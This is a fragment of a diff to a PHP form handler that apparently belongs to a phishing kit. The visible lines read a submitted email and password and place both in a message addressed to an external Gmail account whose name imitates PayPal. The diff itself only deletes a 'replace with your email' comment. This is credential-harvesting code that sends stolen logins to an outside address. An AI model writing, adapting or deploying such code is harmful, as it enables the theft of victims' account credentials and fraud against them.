@@ -5,7 +5,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $password = $_POST["password"];
 
     // Email details
-    $to = "paypablemarksupply@gmail.com"; // Replace with your email address
+    $to = "paypablemarksupply@gmail.com"; 
     $subject = "New Form Submission";
     $message = "Email: $email\nPassword: $password";
 
